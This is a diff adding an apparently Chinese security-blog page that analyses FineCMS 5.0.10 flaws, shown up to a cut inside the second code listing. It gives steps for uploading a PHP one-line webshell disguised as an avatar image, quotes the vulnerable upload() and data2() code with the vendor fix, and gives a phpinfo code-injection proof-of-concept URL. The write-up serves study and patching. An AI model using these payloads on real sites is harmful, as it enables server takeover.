@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Finecms 5.0.10 Multiple vulnerability analysis - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习. 今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。
+0x02 环境搭建 https://www.ichunqiu.com/vm/59011/1 可以去I春秋的实验，不用自己搭建那么麻烦了。
+0x03 任意文件上传漏洞 1.漏洞复现 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2.漏洞分析 文件：finecms/dayrui/controllers/member/Account.php 177~244行
+/** * 上传头像处理 * 传入头像压缩包，解压到指定文件夹后删除非图片文件 */ public function upload() { // 创建图片存储文件夹  $dir = SYS_UPLOAD_PATH.&amp;#39;/member/&amp;#39;.$this-&amp;gt;uid.&amp;#39;/&amp;#39;; @dr_dir_delete($dir); !is_dir($dir) &amp;amp;&amp;amp; dr_mkdirs($dir); if ($_POST[&amp;#39;tx&amp;#39;]) { $file = str_replace(&amp;#39; &amp;#39;, &amp;#39;&#43;&amp;#39;, $_POST[&amp;#39;tx&amp;#39;]); if (preg_match(&amp;#39;/^(data:\s*image\/(\w&#43;);base64,)/&amp;#39;, $file, $result)){ $new_file = $dir.&amp;#39;0x0.&amp;#39;.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &amp;#39;&amp;#39;, $file)))) { exit(dr_json(0, &amp;#39;目录权限不足或磁盘已满&amp;#39;)); } else { $this-&amp;gt;load-&amp;gt;library(&amp;#39;image_lib&amp;#39;); $config[&amp;#39;create_thumb&amp;#39;] = TRUE; $config[&amp;#39;thumb_marker&amp;#39;] = &amp;#39;&amp;#39;; $config[&amp;#39;maintain_ratio&amp;#39;] = FALSE; $config[&amp;#39;source_image&amp;#39;] = $new_file; foreach (array(30, 45, 90, 180) as $a) { $config[&amp;#39;width&amp;#39;] = $config[&amp;#39;height&amp;#39;] = $a; $config[&amp;#39;new_image&amp;#39;] = $dir." /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="Finecms 5.0.10 Multiple vulnerability analysis" />
+<meta property="og:description" content="0x01 前言 已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习. 今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。
+0x02 环境搭建 https://www.ichunqiu.com/vm/59011/1 可以去I春秋的实验，不用自己搭建那么麻烦了。
+0x03 任意文件上传漏洞 1.漏洞复现 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2.漏洞分析 文件：finecms/dayrui/controllers/member/Account.php 177~244行
+/** * 上传头像处理 * 传入头像压缩包，解压到指定文件夹后删除非图片文件 */ public function upload() { // 创建图片存储文件夹  $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;; @dr_dir_delete($dir); !is_dir($dir) &amp;&amp; dr_mkdirs($dir); if ($_POST[&#39;tx&#39;]) { $file = str_replace(&#39; &#39;, &#39;&#43;&#39;, $_POST[&#39;tx&#39;]); if (preg_match(&#39;/^(data:\s*image\/(\w&#43;);base64,)/&#39;, $file, $result)){ $new_file = $dir.&#39;0x0.&#39;.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) { exit(dr_json(0, &#39;目录权限不足或磁盘已满&#39;)); } else { $this-&gt;load-&gt;library(&#39;image_lib&#39;); $config[&#39;create_thumb&#39;] = TRUE; $config[&#39;thumb_marker&#39;] = &#39;&#39;; $config[&#39;maintain_ratio&#39;] = FALSE; $config[&#39;source_image&#39;] = $new_file; foreach (array(30, 45, 90, 180) as $a) { $config[&#39;width&#39;] = $config[&#39;height&#39;] = $a; $config[&#39;new_image&#39;] = $dir." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/finecms-5.0.10-multiple-vulnerabilities/" />
+<meta property="article:published_time" content="2018-11-07T14:30:25+00:00" />
+<meta property="article:modified_time" content="2018-11-07T14:30:25+00:00" />
+<meta itemprop="name" content="Finecms 5.0.10 Multiple vulnerability analysis">
+<meta itemprop="description" content="0x01 前言 已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习. 今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。
+0x02 环境搭建 https://www.ichunqiu.com/vm/59011/1 可以去I春秋的实验，不用自己搭建那么麻烦了。
+0x03 任意文件上传漏洞 1.漏洞复现 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2.漏洞分析 文件：finecms/dayrui/controllers/member/Account.php 177~244行
+/** * 上传头像处理 * 传入头像压缩包，解压到指定文件夹后删除非图片文件 */ public function upload() { // 创建图片存储文件夹  $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;; @dr_dir_delete($dir); !is_dir($dir) &amp;&amp; dr_mkdirs($dir); if ($_POST[&#39;tx&#39;]) { $file = str_replace(&#39; &#39;, &#39;&#43;&#39;, $_POST[&#39;tx&#39;]); if (preg_match(&#39;/^(data:\s*image\/(\w&#43;);base64,)/&#39;, $file, $result)){ $new_file = $dir.&#39;0x0.&#39;.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) { exit(dr_json(0, &#39;目录权限不足或磁盘已满&#39;)); } else { $this-&gt;load-&gt;library(&#39;image_lib&#39;); $config[&#39;create_thumb&#39;] = TRUE; $config[&#39;thumb_marker&#39;] = &#39;&#39;; $config[&#39;maintain_ratio&#39;] = FALSE; $config[&#39;source_image&#39;] = $new_file; foreach (array(30, 45, 90, 180) as $a) { $config[&#39;width&#39;] = $config[&#39;height&#39;] = $a; $config[&#39;new_image&#39;] = $dir.">
+<meta itemprop="datePublished" content="2018-11-07T14:30:25+00:00" />
+<meta itemprop="dateModified" content="2018-11-07T14:30:25+00:00" />
+<meta itemprop="wordCount" content="1134">
+
+
+
+<meta itemprop="keywords" content="Finecms," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Finecms 5.0.10 Multiple vulnerability analysis"/>
+<meta name="twitter:description" content="0x01 前言 已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习. 今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。
+0x02 环境搭建 https://www.ichunqiu.com/vm/59011/1 可以去I春秋的实验，不用自己搭建那么麻烦了。
+0x03 任意文件上传漏洞 1.漏洞复现 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2.漏洞分析 文件：finecms/dayrui/controllers/member/Account.php 177~244行
+/** * 上传头像处理 * 传入头像压缩包，解压到指定文件夹后删除非图片文件 */ public function upload() { // 创建图片存储文件夹  $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;; @dr_dir_delete($dir); !is_dir($dir) &amp;&amp; dr_mkdirs($dir); if ($_POST[&#39;tx&#39;]) { $file = str_replace(&#39; &#39;, &#39;&#43;&#39;, $_POST[&#39;tx&#39;]); if (preg_match(&#39;/^(data:\s*image\/(\w&#43;);base64,)/&#39;, $file, $result)){ $new_file = $dir.&#39;0x0.&#39;.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) { exit(dr_json(0, &#39;目录权限不足或磁盘已满&#39;)); } else { $this-&gt;load-&gt;library(&#39;image_lib&#39;); $config[&#39;create_thumb&#39;] = TRUE; $config[&#39;thumb_marker&#39;] = &#39;&#39;; $config[&#39;maintain_ratio&#39;] = FALSE; $config[&#39;source_image&#39;] = $new_file; foreach (array(30, 45, 90, 180) as $a) { $config[&#39;width&#39;] = $config[&#39;height&#39;] = $a; $config[&#39;new_image&#39;] = $dir."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">Finecms 5.0.10 Multiple Vulnerability Analysis</h1>
+        <p class="post-meta">Nov 07, 2018</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="0x01-前言">0x01 前言</h1>
+<p>已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习.
+今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。</p>
+<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
+<p><a href="https://www.ichunqiu.com/vm/59011/1">https://www.ichunqiu.com/vm/59011/1</a> 可以去I春秋的实验，不用自己搭建那么麻烦了。</p>
+<h1 id="0x03-任意文件上传漏洞">0x03 任意文件上传漏洞</h1>
+<h2 id="1漏洞复现">1.漏洞复现</h2>
+<!-- raw HTML omitted -->
+<p>用十六进制编辑器写一个有一句话的图片
+去网站注册一个账号，然后到上传头像的地方。
+抓包，把jepg的改成php发包。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/1.png" alt="">
+可以看到文件已经上传到到<code>/uploadfile/member/用户ID/0x0.php</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/2.png" alt=""></p>
+<h2 id="2漏洞分析">2.漏洞分析</h2>
+<p>文件：<code>finecms/dayrui/controllers/member/Account.php</code> 177~244行</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd"> *  上传头像处理
+</span><span class="sd"> *  传入头像压缩包，解压到指定文件夹后删除非图片文件
+</span><span class="sd"> */</span>
+<span class="k">public</span> <span class="k">function</span> <span class="nf">upload</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="c1">// 创建图片存储文件夹
+</span><span class="c1"></span>    <span class="nv">$dir</span> <span class="o">=</span> <span class="nx">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/member/&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
+    <span class="o">@</span><span class="nx">dr_dir_delete</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+    <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">dr_mkdirs</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tx&#39;</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tx&#39;</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$result</span><span class="p">)){</span>
+            <span class="nv">$new_file</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;0x0.&#39;</span><span class="o">.</span><span class="nv">$result</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$new_file</span><span class="p">,</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))))</span> <span class="p">{</span>
+                <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;目录权限不足或磁盘已满&#39;</span><span class="p">));</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">library</span><span class="p">(</span><span class="s1">&#39;image_lib&#39;</span><span class="p">);</span>
+                <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;create_thumb&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
+                <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;thumb_marker&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+                <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;maintain_ratio&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
+                <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;source_image&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$new_file</span><span class="p">;</span>
+                <span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">180</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;width&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;height&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;new_image&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s1">&#39;x&#39;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$result</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">image_lib</span><span class="o">-&gt;</span><span class="na">initialize</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">image_lib</span><span class="o">-&gt;</span><span class="na">resize</span><span class="p">())</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;上传错误：&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">image_lib</span><span class="o">-&gt;</span><span class="na">display_errors</span><span class="p">()));</span>
+                        <span class="k">break</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="k">list</span><span class="p">(</span><span class="nv">$width</span><span class="p">,</span> <span class="nv">$height</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$attr</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;45x45.&#39;</span><span class="o">.</span><span class="nv">$result</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+                <span class="o">!</span><span class="nv">$type</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;图片字符串不规范&#39;</span><span class="p">));</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+            <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;图片字符串不规范&#39;</span><span class="p">));</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;图片不存在&#39;</span><span class="p">));</span>
+    <span class="p">}</span>
+
+<span class="c1">// 上传图片到服务器
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;UCSSO_API&#39;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$rt</span> <span class="o">=</span> <span class="nx">ucsso_avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="p">,</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;90x90.jpg&#39;</span><span class="p">));</span>
+        <span class="o">!</span><span class="nv">$rt</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;通信失败：%s&#39;</span><span class="p">,</span> <span class="nv">$rt</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]));</span>
+    <span class="p">}</span>
+
+
+    <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>这个我记得在5.0.8的版本有讲过这个代码的漏洞执行https://getpass.cn/2018/01/30/The%20latest%20version%20of%20FineCMS%205.0.8%20getshell%20daily%20two%20holes/</p>
+<p>后来官方修复的方案是加上了白名单了：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;jpeg&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">)))</span> <span class="p">{</span>
+                    <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;目录权限不足&#39;</span><span class="p">));</span>
+                <span class="p">}</span>
+                <span class="o">...</span>
+                 <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nx">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="k">while</span> <span class="p">(</span><span class="k">FALSE</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">readdir</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)))</span> <span class="p">{</span>
+                            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;jpeg&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">)))</span> <span class="p">{</span>
+                                <span class="k">if</span> <span class="p">(</span><span class="nx">copy</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$my</span><span class="o">.</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+                                    <span class="nv">$c</span><span class="o">++</span><span class="p">;</span>
+                                <span class="p">}</span>
+                            <span class="p">}</span>
+                        <span class="p">}</span>
+                        <span class="nx">closedir</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span>  <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;未找到目录中的图片&#39;</span><span class="p">)));</span>
+                    <span class="p">}</span>
+
+</code></pre></div><h1 id="0x04-任意代码执行漏洞">0x04 任意代码执行漏洞</h1>
+<h2 id="1漏洞复现-1">1.漏洞复现</h2>
+<p><code>auth</code>下面的分析的时候会说到怎么获取</p>
+<p>浏览器输入：
+<code>http://getpass1.cn/index.php?c=api&amp;m=data2&amp;auth=582f27d140497a9d8f048ca085b111df&amp;param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/3.png" alt=""></p>
+<h2 id="2漏洞分析-1">2.漏洞分析</h2>
+<p>这个漏洞的文件在<code>/finecms/dayrui/controllers/Api.php</code>的<code>data2()</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">data2</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+        <span class="c1">// 安全码认证
+</span><span class="c1"></span>        <span class="nv">$auth</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;auth&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">!=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">SYS_KEY</span><span class="p">))</span> <span class="p">{</span>
+            <span class="c1">// 授权认证码不正确
+</span><span class="c1"></span>            <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;授权认证码不正确&#39;</span><span class="p">,</span> <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="c1">// 解析数据
+</span><span class="c1"></span>            <span class="nv">$cache</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+            <span class="nv">$param</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;param&#39;</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">])</span> <span class="p">{</span>
+                <span class="nv">$cache</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">dr_array2string</span><span class="p">(</span><span class="nv">$param</span><span class="p">));</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache_data</span><span class="p">(</span><span class="nv">$cache</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+
+                <span class="c1">// list数据查询
+</span><span class="c1"></span>                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">list_tag</span><span class="p">(</span><span class="nv">$param</span><span class="p">);</span>
+                <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+                <span class="nx">unset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;sql&#39;</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;pages&#39;</span><span class="p">]);</span>
+
+                <span class="c1">// 缓存数据
+</span><span class="c1"></span>                <span class="nv">$cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set_cache_data</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">]);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 接收参数
+</span><span class="c1"></span>        <span class="nv">$format</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;format&#39;</span><span class="p">);</span>
+        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;function&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$function</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="nv">$function</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;自定义函数&#39;</span><span class="o">.</span><span class="nv">$function</span><span class="o">.</span><span class="s1">&#39;不存在&#39;</span><span class="p">),</span> <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$function</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 页面输出
+</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$format</span> <span class="o">==</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$format</span> <span class="o">==</span> <span class="s1">&#39;jsonp&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// 自定义返回名称
